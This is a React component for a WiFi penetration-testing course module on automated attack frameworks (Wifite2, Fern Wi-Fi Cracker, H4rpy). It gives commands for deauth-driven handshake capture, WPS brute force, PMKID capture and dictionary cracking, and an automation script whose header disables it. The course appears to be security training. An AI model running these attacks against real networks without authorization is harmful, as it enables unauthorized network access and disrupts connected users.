import { Bot, AlertTriangle, Info, Cpu, Zap, Shield } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const AutomatedFrameworks = () => {
  const wifite2Script = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# Wifite2 Automated Attack Script
# Configurable automated WiFi attack runner
# Usage: sudo bash run_wifite.sh [interface]

set -e

INTERFACE=\${1:-wlan1mon}

echo "=========================================="
echo "     Wifite2 Automated Attack Runner"
echo "=========================================="
echo ""

# Ensure wifite is installed
if ! command -v wifite &>/dev/null; then
    echo "[*] Installing wifite2..."
    sudo apt install -y wifite
fi

# Ensure supporting tools
echo "[*] Checking supporting tools..."
for tool in aircrack-ng reaver bully hashcat hcxdumptool hcxpcapngtool; do
    if command -v \$tool &>/dev/null; then
        echo "  [+] \$tool: installed"
    else
        echo "  [-] \$tool: missing (some attacks may fail)"
    fi
done

echo ""
echo "[*] Starting Wifite2..."
echo "[*] Interface: \$INTERFACE"
echo "[!] Press Ctrl+C at any time to stop"
echo ""

# Run wifite with comprehensive options
sudo wifite \\
    --interface \$INTERFACE \\
    --kill \\
    --dict /usr/share/wordlists/rockyou.txt \\
    --wpa \\
    --wps \\
    --pmkid \\
    --no-wep \\
    -v`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Bot className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 11</span>
              <h2 className="text-2xl font-bold text-foreground">Automated Attack Frameworks</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Automated frameworks combine multiple attack techniques into streamlined workflows. 
            This module covers Wifite2, Fern Wi-Fi Cracker, and H4rpy — tools that automate 
            scanning, handshake capture, WPS attacks, and cracking in a single run.
          </p>

          {/* Theory */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              Manual vs Automated Attacks
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">Why Manual First:</strong> You MUST understand the underlying 
                commands (Modules 01-08) before using automation. Automated tools can fail silently, produce 
                false negatives, or miss opportunities a manual tester would catch.
              </p>
              <p>
                <strong className="text-foreground">When to Automate:</strong> Use frameworks for rapid initial 
                assessment, time-constrained engagements, or to test multiple networks simultaneously. Always 
                validate automated findings manually.
              </p>
            </div>
          </div>

          {/* Warning */}
          <div className="p-4 rounded-lg border border-warning/50 bg-warning/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-warning flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-warning mb-1">Professional Note</h4>
                <p className="text-sm text-muted-foreground">
                  In professional penetration tests, automated tools are a starting point, not a replacement 
                  for manual testing. Document which tools you used and verify all findings manually.
                </p>
              </div>
            </div>
          </div>

          {/* Wifite2 */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Zap className="w-5 h-5 text-accent" />
              Wifite2 — Automated WiFi Auditing
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Wifite2?</strong> A complete rewrite of the original 
                Wifite. Automates the entire attack chain: scanning → handshake capture → PMKID → WPS → cracking. 
                The most popular automated WiFi attack tool.
              </p>
              <p>
                <strong className="text-foreground">Attack Priority:</strong> Wifite2 automatically tries attacks 
                in order of effectiveness: PMKID capture → WPA handshake (with deauth) → WPS Pixie Dust → WPS brute force → dictionary crack.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Wifite2 Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y wifite"
              description="Step 1: Install Wifite2"
              explanation="Available in Kali repos. Install supporting tools for full functionality: hashcat, hcxdumptool, hcxpcapngtool, reaver, bully."
            />
            <CommandBlock
              command="sudo apt install -y hcxdumptool hcxtools hashcat reaver bully"
              description="Step 2: Install all supporting tools"
              explanation="Wifite2 uses these tools under the hood. Without them, certain attacks will be skipped."
            />
            <CommandBlock
              command="sudo wifite --interface wlan1mon"
              description="Step 3: Basic Wifite2 scan"
              explanation="Starts scanning for networks. Displays all APs with encryption, WPS status, and client count. Select targets interactively."
              output={`  .               .
 .´  ·  .     .  ·  \`.  wifite2 2.7.0
 :  :  :  (¯)  :  :  :  
  \`.  ·  \` /\\ \`  ·  .´  automated wireless auditor
    \`·  .  \\/  .  ·\`   

 [+] Interface wlan1mon in monitor mode
 [+] Scanning (press Ctrl+C to stop)

   NUM  ESSID              BSSID             CH  ENC   PWR  WPS  CLIENTS
   ---  -----------------  ----------------  --  ----  ---  ---  -------
     1  TargetNetwork      AA:BB:CC:DD:EE:01  6  WPA2  -45  Yes  3
     2  CorpWiFi           AA:BB:CC:DD:EE:02 11  WPA2  -52  No   1
     3  HomeNet            AA:BB:CC:DD:EE:03  1  WPA2  -67  Yes  0
     4  GuestWiFi          AA:BB:CC:DD:EE:04  6  OPN   -71  No   2`}
            />
            <CommandBlock
              command="sudo wifite --interface wlan1mon --kill --wpa --wps --pmkid --dict /usr/share/wordlists/rockyou.txt"
              description="Full attack mode"
              explanation="--kill stops interfering processes, --wpa enables WPA attacks, --wps enables WPS attacks, --pmkid enables PMKID capture, --dict specifies wordlist."
            />
            <CommandBlock
              command="sudo wifite --interface wlan1mon --wpa --no-wps --pmkid-timeout 30 --num-deauths 5"
              description="WPA-only attacks (no WPS)"
              explanation="Focus only on WPA handshake/PMKID attacks. --pmkid-timeout limits PMKID wait, --num-deauths controls deauth count."
            />
            <CommandBlock
              command="sudo wifite --interface wlan1mon --wps-only --wps-no-lock"
              description="WPS-only attacks"
              explanation="Only attempt WPS Pixie Dust and brute force. --wps-no-lock skips APs with WPS lockout detected."
            />
            <CommandBlock
              command="sudo wifite --interface wlan1mon --cracked"
              description="View previously cracked networks"
              explanation="Shows all networks that Wifite2 has successfully cracked in previous sessions. Results stored in ~/wifite/cracked.json."
            />
          </div>

          {/* Fern Wi-Fi Cracker */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Shield className="w-5 h-5 text-success" />
              Fern Wi-Fi Cracker — GUI WiFi Auditor
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Fern?</strong> A Python/Qt-based GUI tool for wireless 
                security auditing. Provides a graphical interface for WEP/WPA cracking, WPS attacks, and session 
                hijacking. Good for demonstrations and less CLI-experienced team members.
              </p>
              <p>
                <strong className="text-foreground">Key Features:</strong> Automatic AP detection, WPA dictionary 
                attack, WPS brute force, session hijacking (ARP poisoning), GeoIP tracking, and MAC address changing.
              </p>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y fern-wifi-cracker"
              description="Install Fern Wi-Fi Cracker"
              explanation="Available in Kali repos. Installs the GUI application with all dependencies."
            />
            <CommandBlock
              command="sudo fern-wifi-cracker"
              description="Launch Fern Wi-Fi Cracker"
              explanation="Opens the GUI. Select your wireless interface from the dropdown, then click 'Scan for Access Points'. Click an AP to begin attack."
            />
            <CommandBlock
              command="sudo fern-wifi-cracker --interface wlan1mon"
              description="Launch with specific interface"
              explanation="Pre-selects the interface. The GUI will show discovered networks with encryption type and client count."
            />
          </div>

          {/* Fern GUI Walkthrough */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Fern Wi-Fi Cracker GUI Walkthrough</h3>
            <div className="space-y-2 text-sm text-muted-foreground">
              <p><strong className="text-foreground">1.</strong> Select interface from dropdown (wlan1/wlan1mon)</p>
              <p><strong className="text-foreground">2.</strong> Click "Scan for Access Points" → networks populate</p>
              <p><strong className="text-foreground">3.</strong> Click "WPA" button to see WPA networks</p>
              <p><strong className="text-foreground">4.</strong> Select target network → "Attack" button appears</p>
              <p><strong className="text-foreground">5.</strong> Choose wordlist → Click "WiFi Attack"</p>
              <p><strong className="text-foreground">6.</strong> Fern auto-captures handshake (deauths clients) and cracks</p>
              <p><strong className="text-foreground">7.</strong> Cracked passwords appear in "Key Database" section</p>
            </div>
          </div>

          {/* H4rpy */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Cpu className="w-5 h-5 text-warning" />
              H4rpy — Automated WPA/WPA2 Attacker
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is H4rpy?</strong> A bash-based automated tool that 
                streamlines WPA/WPA2 attacks. It automates the aircrack-ng workflow: scan → deauth → capture → crack. 
                Lighter than Wifite2 with a simpler codebase that's easy to customize.
              </p>
              <p>
                <strong className="text-foreground">Advantage:</strong> Being a bash script, H4rpy is easy to 
                audit, modify, and integrate into your own automation pipelines. Great learning tool to understand 
                the attack chain.
              </p>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/MS-WEB-BN/h4rpy.git && cd h4rpy && sudo bash install.sh"
              description="Install H4rpy"
              explanation="Clone from GitHub and run the installer. Checks for aircrack-ng suite and other dependencies."
            />
            <CommandBlock
              command="sudo h4rpy"
              description="Launch H4rpy"
              explanation="Interactive menu-driven tool. Select interface → scan for targets → choose attack type → H4rpy handles the rest."
              output={`
 ██╗  ██╗██╗  ██╗██████╗ ██████╗ ██╗   ██╗
 ██║  ██║██║  ██║██╔══██╗██╔══██╗╚██╗ ██╔╝
 ███████║███████║██████╔╝██████╔╝ ╚████╔╝
 ██╔══██║╚════██║██╔══██╗██╔═══╝   ╚██╔╝
 ██║  ██║     ██║██║  ██║██║        ██║
 ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝

 [1] Scan for targets
 [2] Capture handshake
 [3] Crack handshake
 [4] Evil Twin attack
 [5] Exit
 
 Select option:`}
            />
          </div>

          {/* Comparison Table */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Framework Comparison</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary">Feature</th>
                    <th className="text-left py-2 pr-4 text-foreground">Wifite2</th>
                    <th className="text-left py-2 pr-4 text-foreground">Fern</th>
                    <th className="text-left py-2 text-foreground">H4rpy</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Interface</td>
                    <td className="py-2 pr-4">CLI</td>
                    <td className="py-2 pr-4">GUI</td>
                    <td className="py-2">CLI (menu)</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPA Attack</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2">✅</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPS Attack</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2">❌</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">PMKID</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2">❌</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Evil Twin</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2">✅</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">Customizable</td>
                    <td className="py-2 pr-4">Medium</td>
                    <td className="py-2 pr-4">Low</td>
                    <td className="py-2">High (bash)</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Automation Script */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Automation Script</h3>
          <ScriptBlock
            title="Wifite2 Automated Attack Runner"
            filename="run_wifite.sh"
            language="bash"
            description="Checks all supporting tools and launches Wifite2 with comprehensive attack options"
            code={wifite2Script}
          />
        </div>
      </div>
    </section>
  );
};
